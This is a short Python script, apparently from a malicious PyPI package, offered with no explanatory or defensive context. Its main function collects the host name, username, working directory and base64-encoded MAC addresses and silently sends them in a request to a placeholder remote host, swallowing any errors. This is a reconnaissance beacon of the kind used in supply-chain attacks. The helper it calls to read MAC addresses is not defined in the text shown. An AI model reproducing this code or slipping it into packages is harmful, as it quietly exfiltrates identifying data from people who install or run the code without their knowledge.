import base64
import getpass
import os
import platform
import random
import urllib
import urllib.parse
import urllib.request


def main():
    hostname = platform.node()
    username = getpass.getuser()
    current_path = os.getcwd()
    rd_num = random.randint(10000, 99999)
    mac_addresses = get_mac_addresses()
    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode("utf-8")).decode(
        "utf-8"
    )

    urls = [
        "http://example.com/",
    ]

    for url in urls:
        params = {
            "hostname": hostname,
            "username": username,
            "dir": current_path,
            "mac_address": bs64_encode_mac,
        }
        full_url = f"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}"
        try:
            with urllib.request.urlopen(full_url) as response:
                pass
        except Exception as e:
            pass
